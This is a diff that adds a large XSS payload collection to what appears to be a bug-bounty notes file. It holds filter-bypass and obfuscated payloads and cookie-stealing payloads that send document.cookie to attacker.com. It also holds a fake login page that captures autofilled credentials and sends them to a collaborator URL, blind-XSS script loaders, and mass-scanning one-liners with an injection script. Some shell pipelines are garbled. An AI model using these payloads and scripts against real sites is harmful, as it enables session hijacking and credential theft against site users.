@@ -510,7 +510,7 @@ Developers should avoid 'unsafe-inline', because it defeatsmuch of the purpose o
 
 #### LIst of techniques  and payload:
 
-<input/onmouseover="javaSCRIPT:confirm(1)”
+<input/onmouseover="javaSCRIPT:confirm(1)"
 
 Awesome payload where we used any tag inside svg tag especially animate tag where we set any attribute to parent tag here is <a> , from below payload  <a href=javascript:alert(1)> look like this. this is used to bypass where all event handlers are blocked or tags. 
 
@@ -573,3 +573,225 @@ Double-encoded HTML entities
 Indirect property access (location vs document)
 
 
+
+
+"<%21--><Svg+OnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--1"%29"<%21--><Svg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--
+
+
+"><script>alert`1`</script>
+"><script>top </script>
+"><iframe src="javascript:alert(1)">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<ScRiPt>alert(1)</ScRiPt>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<svg onload=alert(1)>
+<svg%09onload=alert(1)>
+<svg onload=alert(1)>
+
+
+
+Advance Payload1:
+<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><IMG SrC=x OnError=&#99;&#x6f;&#x00006e;\u0066irm(1)>
+
+
+Payload2:
+<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><SvG OnLoAd=&#99;&#x6f;&#x00006e;\u0066irm(1)>
+
+
+Payload3:
+<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><iFRame SRC=x ONLoAd=&#99;&#x6f;&#x00006e;\u0066irm(1)></iframe>
+
+
+
+
+Cookie Stealing payload :
+<img src=x onerror="new Image().src='https://attacker.com?c='+document.cookie">
+<img src=x onerror="this.src='//attacker.com/log?c='+document.cookie" style="display:none">
+<img src=x onerror="fetch('https://attacker.com', {method:'POST', body:document.cookie})">
+<img src=x onerror="navigator.sendBeacon('https://attacker.com', document.cookie)">
+<img src=x onerror="new Image().src='//attacker.com?c='+document.cookie+'&r='+document.referrer">
+<img src=x onerror="new Image().src='//attacker.com?c='+document.cookie+'&u='+navigator.userAgent+'&l='+location.href">
+<img src=x onerror="new Image().src='//attacker.com?d='+btoa(document.cookie)">
+<img src=x onerror="var s=document.createElement('script');s.src='//attacker.com/log.js?c='+document.cookie;document.body.appendChild(s)">
+<input autofocus onfocus="new Image().src='//attacker.com?c='+document.cookie">
+<img src=1 onerror=alert(document.cookie)>
+<img src=1 onerror=eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwczovL2F0dGFja2VyLmNvbT9jPScrZG9jdW1lbnQuY29va2ll'))>
+
+
+
+
+
+Autocomplete username , password and other information capture code
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+</head>
+<body>
+  <h2>Welcome back! Please sign in</h2>
+
+  <!-- Fake login form -->
+  <form id="loginForm">
+    <input type="text" name="username" id="username" placeholder="Username" autocomplete="username"><br><br>
+    <input type="password" name="password" id="password" placeholder="Password" autocomplete="current-password"><br><br>
+    <input type="submit" value="Login">
+  </form>
+
+  <script>
+    // Wait a bit for autofill
+    setTimeout(function() {
+      let username = document.getElementById('username').value;
+      let password = document.getElementById('password').value;
+
+      // Exfil to Burp Collaborator
+      if (username || password) {
+        new Image().src = 'https://COLLABORATOR_URL_HERE/?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password);
+      }
+    }, 2000); // wait 2 seconds for autofill
+  </script>
+</body>
+</html>
+
+
+
+Payload1:
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><IMG SrC=x OnError=&#99;&#x6f;&#x00006e;\u0066irm(1)>
+
+
+Payload2:
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><SvG OnLoAd=&#99;&#x6f;&#x00006e;\u0066irm(1)>
+
+
+Payload3:
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><iFRame SRC=x ONLoAd=&#99;&#x6f;&#x00006e;\u0066irm(1)></iframe>
+
+
+
+Automation script:
+echo example.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
+
+
+
+<iframe src="javascript:alert(1)">
+<math><mtext></mtext><script>alert(1)</script></math>
+<details open ontoggle=alert(1)>
+"><script src=//xss.rocks/xss.js></script>
+<img src=x onerror=confirm`XSS`>
+"><img src=x onerror=fetch('https://yourwebhook.site')>
+
+
+
+cat params.txt | dalfox pipe -o xss_results.txt
+python3 XSStrike/xsstrike.py -u "https://target.com/index.php?search=query"
+
+
+
+<img src=x onerror="new Image().src='https://attacker.com?c='+document.cookie">
+<img src=x onerror="this.src='//attacker.com/log?c='+document.cookie" style="display:none">
+<img src=x onerror="fetch('https://attacker.com', {method:'POST', body:document.cookie})">
+<img src=x onerror="navigator.sendBeacon('https://attacker.com', document.cookie)">
+<img src=x onerror="new Image().src='//attacker.com?c='+document.cookie+'&r='+document.referrer">
+<img src=x onerror="new Image().src='//attacker.com?c='+document.cookie+'&u='+navigator.userAgent+'&l='+location.href">
+<img src=x onerror="new Image().src='//attacker.com?d='+btoa(document.cookie)">
+<img src=x onerror="var s=document.createElement('script');s.src='//attacker.com/log.js?c='+document.cookie;document.body.appendChild(s)">
+<input autofocus onfocus="new Image().src='//attacker.com?c='+document.cookie">
+<img src=1 onerror=alert(document.cookie)>
+<img src=1 onerror=eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwczovL2F0dGFja2VyLmNvbT9jPScrZG9jdW1lbnQuY29va2ll'))>
+
+
+
+
+echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox
+echo "example.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
+echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
+
+
+ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"
+
+cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
+subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
+subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence
+
+
+cat sub.txt | gau | uro |  gf xss | qsreplace '"/><img src=x onerror=alert(1)>' | httpx -silent -v -mc 200 -match-string '"/><img src=x onerror=alert(1)>' | tee xss_result.txt
+
+
+XSS Payload Written In Linear B language ⚡️
+𐀀='',𐀁=!𐀀+𐀀,𐀂=!𐀁+𐀀,𐀃=𐀀+{},𐀄=𐀁[𐀀++],𐀅=𐀁[𐀆=𐀀],𐀇=++𐀆+𐀀,𐀈=𐀃[𐀆+𐀇],𐀁[𐀈+=𐀃[𐀀]+(𐀁.𐀂+𐀃)[𐀀]+𐀂[𐀇]+𐀄+𐀅+𐀁[𐀆]+𐀈+𐀄+𐀃[𐀀]+𐀅][𐀈](𐀂[𐀀]+𐀂[𐀆]+𐀁[𐀇]+𐀅+𐀄+"('𐀀𐀁𐀂𐀃𐀄 𐀅𐀆𐀇𐀈')")()
+
+
+
+cat domains.txt | httpx -silent -ports 80,443,8080,8443,3000,8000 | waybackurls | grep"=" | uro | gf xss | qsreplace'"><script>alert(1)</script>' |whileread url;do curl -s"$url" | grep"<script>alert(1)</script>";done
+
+
+
+waybackurls testphp.vulnweb.com | tee testphp1.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz. json && cat combinedfuzz.json |
+while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0; 31mVulnerable\n" || echo "$host \033 [0;32mNot Vulnerable\n";done
+
+
+
+
+#!/bin/bash
+
+# Check if domain and payload are provided
+if [ "$#" -ne 2 ]; then
+    echo "Usage: $0 <domain> <payload>"
+    echo "Example: $0 testphp.vulnweb.com '\"><script>alert(1)</script>'"
+    exit 1
+fi
+
+# Assign inputs to variables
+DOMAIN=$1
+PAYLOAD=$2
+
+# Define the paths for output files
+URL_FILE="results/${DOMAIN}.txt"          # Default output path from ParamSpider
+FUZZED_FILE="fuzzed_${DOMAIN}.json"
+REPORT_FILE="${DOMAIN}_xss_report.txt"
+VULNERABLE_FILE="vulnerable_${DOMAIN}.txt"
+NON_VULNERABLE_FILE="non_vulnerable_${DOMAIN}.txt"
+
+# Step 1: Use ParamSpider to gather URLs with parameters
+echo "[*] Gathering URLs from $DOMAIN with ParamSpider..."
+paramspider -d "$DOMAIN"
+
+# Check if ParamSpider generated the URL file
+if [ ! -f "$URL_FILE" ]; then
+    echo "[!] Error: URL file not found at $URL_FILE."
+    exit 1
+fi
+
+# Step 2: Replace parameters with the provided XSS payload
+echo "[*] Inserting XSS payload into URLs..."
+cat "$URL_FILE" | qsreplace "$PAYLOAD" > "$FUZZED_FILE"
+
+# Initialize report files
+echo "[*] Saving report to $REPORT_FILE"
+echo "XSS Vulnerability Report for $DOMAIN" > "$REPORT_FILE"
+echo "Payload Used: $PAYLOAD" >> "$REPORT_FILE"
+echo "---------------------------------------" >> "$REPORT_FILE"
+echo "Vulnerable URLs:" > "$VULNERABLE_FILE"
+echo "Non-Vulnerable URLs:" > "$NON_VULNERABLE_FILE"
+
+# Step 3: Loop through each URL to check for XSS vulnerability
+echo "[*] Testing URLs for XSS vulnerability..."
+while read -r url; do
+    if curl --silent --path-as-is --insecure "$url" | grep -qs "$PAYLOAD"; then
+        echo -e "$url \033[0;31mVulnerable\033[0m"
+        echo "$url Vulnerable" >> "$REPORT_FILE"
+        echo "$url" >> "$VULNERABLE_FILE"
+    else
+        echo -e "$url \033[0;32mNot Vulnerable\033[0m"
+        echo "$url Not Vulnerable" >> "$REPORT_FILE"
+        echo "$url" >> "$NON_VULNERABLE_FILE"
+    fi
+done < "$FUZZED_FILE"
+
+echo "[*] XSS testing completed. Results saved to:"
+echo " - Report: $REPORT_FILE"
+echo " - Vulnerable URLs: $VULNERABLE_FILE"
+echo " - Non-Vulnerable URLs: $NON_VULNERABLE_FILE"
